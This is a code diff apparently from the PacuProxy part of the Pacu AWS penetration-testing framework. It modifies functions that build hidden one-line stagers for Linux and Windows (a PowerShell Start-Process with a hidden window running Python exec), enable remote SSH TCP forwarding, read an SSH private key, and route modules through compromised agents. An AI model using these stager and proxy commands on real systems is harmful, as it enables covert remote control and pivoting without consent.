@@ -337,9 +337,9 @@ class Main:
         if os == 'sh':  # Linux one-liner (uses \" to escape inline double-quotes)
             return 'python3 -c "{}" &'.format("exec(\\\"\\\"\\\"{}\\\"\\\"\\\")".format(python_stager))
         elif os == 'ps':  # Windows one-liner (uses `" to escape inline double-quotes)
-            return 'Start-Process -FilePath "python3" -Verb open -WindowStyle Hidden -ArgumentList "-c {}"'.format('exec(`\"`\"`\"{}`\"`\"`\")'.format(python_stager))
+            return 'Start-Process -FilePath "py" -Verb open -WindowStyle Hidden -ArgumentList "-c {}"'.format('exec(`\"`\"`\"{}`\"`\"`\")'.format(python_stager))
         else:
-            self.print('Incorrect input, expected target operating system ("win" or "lin"), received: {}'.format(os))
+            self.print('Incorrect input, expected target operating system ("sh" or "ps"), received: {}'.format(os))
             return False
 
     def get_ssh_user(self, ssh_username):
@@ -431,6 +431,8 @@ class Main:
                             config_file.write(contents)
                         elif action == 'add':
                             contents += '\nAllowTcpForwarding remote'
+                            config_file.write(contents)
+                        else:
                             config_file.write(contents)
                     with open(f'{ssh_dir}/id_rsa', 'r') as config_file:
                         ssh_priv_key = config_file.read()
@@ -621,11 +623,18 @@ class Main:
 
                             print('Setting proxy target to agent {}...'.format(command[2]))
 
+                            old_username = proxy_ssh_username
+
                             # Find or create an SSH user
                             proxy_ssh_username = self.get_ssh_user(proxy_ssh_username)
                             if proxy_ssh_username is None:
                                 self.print('No SSH user on the local PacuProxy server, not routing traffic through the target agent.')
                                 return
+
+                            # In case there previously was a user and for some reason a new one needed to be created,
+                            # ensure that a new key gets created for them
+                            if not old_username == proxy_ssh_username:
+                                proxy_ssh_priv_key = None
 
                             restart = False
                             if proxy_ssh_priv_key is None or proxy_ssh_priv_key == '':
@@ -833,7 +842,7 @@ class Main:
             if proxy_settings.target_agent is None or proxy_settings.target_agent == []:
                 self.print('  Running module {}...'.format(module_name))
             else:
-                self.print('  Running module {} on agent {}...'.format(module_name, proxy_settings.target_agent[0]))
+                self.print('  Running module {} on agent at {}...'.format(module_name, proxy_settings.target_agent[0]))
             self.print('    {}\n'.format(module.help()[0]['description']))
 
             try:
@@ -1288,6 +1297,7 @@ class Main:
                         proxy_settings = self.get_proxy_settings()
                     if proxy_settings is not None and proxy_settings.listening is True:
                         # PacuProxy was listening on last shutdown, so restart it
+                        self.print('Auto-starting PacuProxy listener from previous session on {}:{}...'.format(proxy_settings.ip, proxy_settings.port))
                         self.start_proxy()
 
                     idle_ready = True
